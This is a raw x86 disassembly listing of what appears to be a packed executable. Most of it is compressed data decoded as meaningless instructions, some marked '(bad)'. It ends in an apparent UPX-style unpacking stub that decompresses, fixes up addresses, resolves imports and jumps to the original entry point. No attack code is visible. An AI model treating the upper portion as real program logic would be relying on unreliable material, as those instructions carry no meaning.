  47accf:	arpl   WORD PTR [edx+ebx*4],cx
  47acd2:	imul   eax,DWORD PTR [edi+0x4d0ba41d],0x5c
  47acd9:	daa    
  47acda:	retf   0x7b05
  47acdd:	lods   eax,DWORD PTR ds:[esi]
  47acde:	fstp   QWORD PTR [edi+0x75]
  47ace1:	jae    0x47ad28
  47ace3:	adc    eax,0xe3062cb1
  47ace8:	ret    0xaec
  47aceb:	sub    cl,BYTE PTR [edi+0x61]
  47acee:	sbb    eax,DWORD PTR fs:[ecx+0x25]
  47acf2:	mov    bh,0x65
  47acf4:	int3   
  47acf5:	or     eax,0x6b630d1c
  47acfa:	mov    al,0x3b
  47acfc:	cld    
  47acfd:	mov    es,eax
  47acff:	push   esi
  47ad00:	imul   esp,DWORD PTR [ebp+0x77],0xe6a664f
  47ad07:	outs   dx,DWORD PTR ds:[esi]
  47ad08:	jbe    0x47ad80
  47ad0a:	mov    ebx,0x9f748b1b
  47ad0f:	dec    ebp
  47ad10:	cli    
  47ad11:	imul   eax,DWORD PTR [edx+0x79],0xa76f54da
  47ad18:	and    eax,0x64fb46f9
  47ad1d:	gs inc ebx
  47ad1f:	push   0x704fbc4e
  47ad24:	outs   dx,BYTE PTR gs:[esi]
  47ad26:	int    0xde
  47ad28:	lods   eax,DWORD PTR ds:[si]
  47ad2a:	inc    edi
  47ad2b:	pop    ecx
  47ad2c:	cmp    BYTE PTR [edx+0x74],dl
  47ad2f:	ins    BYTE PTR es:[edi],dx
  47ad30:	cmp    ebx,DWORD PTR [ebp-0x706f1c65]
  47ad36:	push   cs
  47ad37:	pop    edx
  47ad38:	gs jb  0x47adaa
  47ad3b:	push   ebx
  47ad3c:	jle    0x47adad
  47ad3e:	jb     0x47ad2c
  47ad40:	jecxz  0x47ad02
  47ad42:	sbb    al,0x44
  47ad44:	jmp    0x7aac0b9c
  47ad49:	js     0x47ad23
  47ad4b:	retf   0x5338
  47ad4e:	push   ebx
  47ad4f:	adc    edx,DWORD PTR [eax+0x6f]
  47ad52:	push   esi
  47ad53:	js     0x47ad0d
  47ad55:	push   esi
  47ad56:	adc    BYTE PTR es:[esp+ebx*2-0x36],bh
  47ad5b:	mov    ebp,0x5db0d1ac
  47ad60:	push   ebx
  47ad61:	sbb    esp,DWORD PTR [ebp-0x51]
  47ad64:	push   ebp
  47ad65:	lahf   
  47ad66:	(bad)  
  47ad67:	xor    BYTE PTR [esi+0x30],bh
  47ad6a:	sub    al,0x65
  47ad6c:	mov    bl,0x75
  47ad6e:	popa   
  47ad6f:	addr16 ds pop eax
  47ad72:	adc    cl,BYTE PTR [edx]
  47ad74:	fistp  DWORD PTR ds:0xd563072
  47ad7a:	(bad)  
  47ad7b:	(bad)  
  47ad7c:	and    DWORD PTR ds:[edi+edx*2],ebp
  47ad80:	popa   
  47ad81:	imul   esp,DWORD PTR [ebp-0x6f],0xcc161b53
  47ad88:	mov    ecx,0x624f3b37
  47ad8d:	push   0xffffff9f
  47ad8f:	adc    al,0xf0
  47ad91:	cli    
  47ad92:	es xor eax,0x14058497
  47ad98:	cdq    
  47ad99:	les    esi,FWORD PTR [edx]
  47ad9b:	fld    DWORD PTR [edx-0x50]
  47ad9e:	inc    esp
  47ad9f:	add    DWORD PTR [ecx+0x9],0x57
  47ada3:	pop    ebp
  47ada4:	(bad)  
  47ada5:	and    al,0xf
  47ada7:	ins    DWORD PTR es:[edi],dx
  47ada8:	jo     0x47adeb
  47adaa:	imul   ebp,DWORD PTR [ebp+0x41],0x6cd3a6ca
  47adb1:	sahf   
  47adb2:	mov    DWORD PTR [eax],eax
  47adb4:	push   esi
  47adb5:	inc    esp
  47adb6:	xor    BYTE PTR gs:[ebx+0x43c0db6d],bl
  47adbd:	mov    ch,0x73
  47adbf:	pop    ss
  47adc0:	xchg   ebx,eax
  47adc1:	cmp    al,0xc1
  47adc3:	lods   eax,DWORD PTR ds:[esi]
  47adc4:	rcl    ch,cl
  47adc6:	fld    QWORD PTR [edi]
  47adc8:	jo     0x47ae3c
  47adca:	call   0x8199dd35
  47adcf:	pop    esi
  47add0:	sub    ebx,DWORD PTR [eax]
  47add2:	xchg   esi,eax
  47add3:	jae    0x47ae18
  47add5:	jo     0x47ae1a
  47add7:	test   BYTE PTR [edx+0x3030a1a3],cl
  47addd:	imul   ebx,DWORD PTR [eax+0x25],0x63
  47ade1:	mov    edx,0x37af19c1
  47ade6:	and    al,0x1b
  47ade8:	dec    ebx
  47ade9:	inc    ecx
  47adea:	pop    ds
  47adeb:	in     al,0xff
  47aded:	arpl   WORD PTR [eax+edx*2+0x45],sp
  47adf1:	add    BYTE PTR [eax],al
  47adf3:	dec    esp
  47adf4:	add    DWORD PTR [eax+eax*1],eax
  47adf7:	add    DWORD PTR [eax+0xe0709a],0xf
  47adfe:	add    ebx,ecx
  47ae00:	repnz mov ecx,0x5010bfc
  47ae06:	or     al,0x0
  47ae08:	mov    eax,0xc478029e
  47ae0d:	adc    al,dl
  47ae0f:	push   ss
  47ae10:	lods   al,BYTE PTR ds:[esi]
  47ae11:	fwait
  47ae12:	xor    eax,0x41a0b40
  47ae17:	xor    eax,DWORD PTR [edi]
  47ae19:	fldcw  WORD PTR [ecx+ecx*8]
  47ae1c:	outs   dx,BYTE PTR ds:[esi]
  47ae1d:	or     al,0x90
  47ae1f:	pop    es
  47ae20:	cmp    DWORD PTR [ebx],ebp
  47ae22:	jnp    0x47adfd
  47ae24:	fwait
  47ae25:	mov    ebp,0x60704
  47ae2a:	pop    eax
  47ae2b:	rol    DWORD PTR [ebx-0x670427fc],1
  47ae31:	adc    al,0x5
  47ae33:	add    ah,bh
  47ae35:	jge    0x47ae68
  47ae37:	add    BYTE PTR [ebx],al
  47ae39:	push   edi
  47ae3a:	fsubr  DWORD PTR [esi]
  47ae3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47ae3d:	pop    eax
  47ae3e:	add    DWORD PTR [esi],ebx
  47ae40:	cs jg  0x47ae05
  47ae43:	mov    esi,0xd7745f20
  47ae48:	mov    dh,0xeb
  47ae4a:	add    al,0x23
  47ae4c:	jb     0x47aea9
  47ae4e:	mov    eax,0x2e0a20e1
  47ae53:	jb     0x47aeb9
  47ae55:	mov    bl,0x61
  47ae57:	sti    
  47ae58:	xchg   edx,eax
  47ae59:	or     ch,ch
  47ae5b:	push   ss
  47ae5c:	ror    BYTE PTR ds:0xe1bc270a,cl
  47ae62:	inc    eax
  47ae63:	shl    BYTE PTR cs:[esi+eiz*8-0x12],cl
  47ae68:	es xor eax,0x2704294e
  47ae6e:	push   ss
  47ae6f:	(bad)  
  47ae70:	sahf   
  47ae71:	sub    ebp,DWORD PTR [ebx+edx*2-0x40]
  47ae75:	dec    edi
  47ae76:	jae    0x47ae5e
  47ae78:	or     ebp,ebx
  47ae7a:	xchg   BYTE PTR [edi-0x2a],dl
  47ae7d:	cld    
  47ae7e:	repz add BYTE PTR [esi-0x24],bh
  47ae82:	daa    
  47ae83:	add    BYTE PTR [eax-0x3fffffb9],al
  47ae89:	lahf   
  47ae8a:	ror    DWORD PTR [eax*4+0x1200007],cl
  47ae91:	add    BYTE PTR [eax],al
  47ae93:	inc    DWORD PTR [eax]
	...
  47ae9d:	add    BYTE PTR [eax],al
  47ae9f:	add    BYTE PTR [eax-0x42],ah
  47aea2:	adc    eax,0x8d004760
  47aea7:	mov    esi,0xfff8afeb
  47aeac:	push   edi
  47aead:	jmp    0x47aeba
  47aeaf:	nop
  47aeb0:	mov    al,BYTE PTR [esi]
  47aeb2:	inc    esi
  47aeb3:	mov    BYTE PTR [edi],al
  47aeb5:	inc    edi
  47aeb6:	add    ebx,ebx
  47aeb8:	jne    0x47aec1
  47aeba:	mov    ebx,DWORD PTR [esi]
  47aebc:	sub    esi,0xfffffffc
  47aebf:	adc    ebx,ebx
  47aec1:	jb     0x47aeb0
  47aec3:	mov    eax,0x1
  47aec8:	add    ebx,ebx
  47aeca:	jne    0x47aed3
  47aecc:	mov    ebx,DWORD PTR [esi]
  47aece:	sub    esi,0xfffffffc
  47aed1:	adc    ebx,ebx
  47aed3:	adc    eax,eax
  47aed5:	add    ebx,ebx
  47aed7:	jae    0x47aec8
  47aed9:	jne    0x47aee4
  47aedb:	mov    ebx,DWORD PTR [esi]
  47aedd:	sub    esi,0xfffffffc
  47aee0:	adc    ebx,ebx
  47aee2:	jae    0x47aec8
  47aee4:	xor    ecx,ecx
  47aee6:	sub    eax,0x3
  47aee9:	jb     0x47aef8
  47aeeb:	shl    eax,0x8
  47aeee:	mov    al,BYTE PTR [esi]
  47aef0:	inc    esi
  47aef1:	xor    eax,0xffffffff
  47aef4:	je     0x47af6a
  47aef6:	mov    ebp,eax
  47aef8:	add    ebx,ebx
  47aefa:	jne    0x47af03
  47aefc:	mov    ebx,DWORD PTR [esi]
  47aefe:	sub    esi,0xfffffffc
  47af01:	adc    ebx,ebx
  47af03:	adc    ecx,ecx
  47af05:	add    ebx,ebx
  47af07:	jne    0x47af10
  47af09:	mov    ebx,DWORD PTR [esi]
  47af0b:	sub    esi,0xfffffffc
  47af0e:	adc    ebx,ebx
  47af10:	adc    ecx,ecx
  47af12:	jne    0x47af34
  47af14:	inc    ecx
  47af15:	add    ebx,ebx
  47af17:	jne    0x47af20
  47af19:	mov    ebx,DWORD PTR [esi]
  47af1b:	sub    esi,0xfffffffc
  47af1e:	adc    ebx,ebx
  47af20:	adc    ecx,ecx
  47af22:	add    ebx,ebx
  47af24:	jae    0x47af15
  47af26:	jne    0x47af31
  47af28:	mov    ebx,DWORD PTR [esi]
  47af2a:	sub    esi,0xfffffffc
  47af2d:	adc    ebx,ebx
  47af2f:	jae    0x47af15
  47af31:	add    ecx,0x2
  47af34:	cmp    ebp,0xfffff300
  47af3a:	adc    ecx,0x1
  47af3d:	lea    edx,[edi+ebp*1]
  47af40:	cmp    ebp,0xfffffffc
  47af43:	jbe    0x47af54
  47af45:	mov    al,BYTE PTR [edx]
  47af47:	inc    edx
  47af48:	mov    BYTE PTR [edi],al
  47af4a:	inc    edi
  47af4b:	dec    ecx
  47af4c:	jne    0x47af45
  47af4e:	jmp    0x47aeb6
  47af53:	nop
  47af54:	mov    eax,DWORD PTR [edx]
  47af56:	add    edx,0x4
  47af59:	mov    DWORD PTR [edi],eax
  47af5b:	add    edi,0x4
  47af5e:	sub    ecx,0x4
  47af61:	ja     0x47af54
  47af63:	add    edi,ecx
  47af65:	jmp    0x47aeb6
  47af6a:	pop    esi
  47af6b:	mov    edi,esi
  47af6d:	mov    ecx,0xb800
  47af72:	jmp    0x47afa6
  47af74:	mov    al,BYTE PTR [edi]
  47af76:	add    edi,0x1
  47af79:	cmp    al,0x80
  47af7b:	jb     0x47af87
  47af7d:	cmp    al,0x8f
  47af7f:	ja     0x47af87
  47af81:	cmp    BYTE PTR [edi-0x2],0xf
  47af85:	je     0x47af8d
  47af87:	sub    al,0xe8
  47af89:	cmp    al,0x1
  47af8b:	ja     0x47afb0
  47af8d:	cmp    BYTE PTR [edi],0x0
  47af90:	jne    0x47afb0
  47af92:	mov    eax,DWORD PTR [edi]
  47af94:	shr    ax,0x8
  47af98:	rol    eax,0x10
  47af9b:	xchg   ah,al
  47af9d:	sub    eax,edi
  47af9f:	add    eax,esi
  47afa1:	mov    DWORD PTR [edi],eax
  47afa3:	add    edi,0x4
  47afa6:	sub    ecx,0x4
  47afa9:	mov    al,BYTE PTR [edi]
  47afab:	add    edi,0x1
  47afae:	loop   0x47af87
  47afb0:	sub    ecx,0x1
  47afb3:	jg     0x47af74
  47afb5:	lea    edi,[esi+0x78000]
  47afbb:	mov    eax,DWORD PTR [edi]
  47afbd:	or     eax,eax
  47afbf:	je     0x47affd
  47afc1:	mov    ebx,DWORD PTR [edi+0x4]
  47afc4:	lea    eax,[eax+esi*1+0xa2d4c]
  47afcb:	add    ebx,esi
  47afcd:	push   eax
  47afce:	add    edi,0x8
  47afd1:	call   DWORD PTR [esi+0xa2d9c]
  47afd7:	xchg   ebp,eax
  47afd8:	mov    al,BYTE PTR [edi]
  47afda:	inc    edi
  47afdb:	or     al,al
  47afdd:	je     0x47afbb
  47afdf:	mov    ecx,edi
  47afe1:	push   edi
  47afe2:	dec    eax
  47afe3:	repnz scas al,BYTE PTR es:[edi]
  47afe5:	push   ebp
  47afe6:	call   DWORD PTR [esi+0xa2da0]
  47afec:	or     eax,eax
  47afee:	je     0x47aff7
  47aff0:	mov    DWORD PTR [ebx],eax
  47aff2:	add    ebx,0x4
  47aff5:	jmp    0x47afd8
  47aff7:	call   DWORD PTR [esi+0xa2db0]
  47affd:	mov    ebp,DWORD PTR [esi+0xa2da4]
  47b003:	lea    edi,[esi-0x1000]
  47b009:	mov    ebx,0x1000
  47b00e:	push   eax
  47b00f:	push   esp
  47b010:	push   0x4
  47b012:	push   ebx
  47b013:	push   edi
  47b014:	call   ebp
  47b016:	lea    eax,[edi+0x19f]
  47b01c:	and    BYTE PTR [eax],0x7f
  47b01f:	and    BYTE PTR [eax+0x28],0x7f
  47b023:	pop    eax
  47b024:	push   eax
  47b025:	push   esp
  47b026:	push   eax
  47b027:	push   ebx
  47b028:	push   edi
  47b029:	call   ebp
  47b02b:	pop    eax
  47b02c:	popa   
  47b02d:	lea    eax,[esp-0x80]
  47b031:	push   0x0
  47b033:	cmp    esp,eax
  47b035:	jne    0x47b031
  47b037:	sub    esp,0xffffff80
  47b03a:	jmp    0x40c478
	...
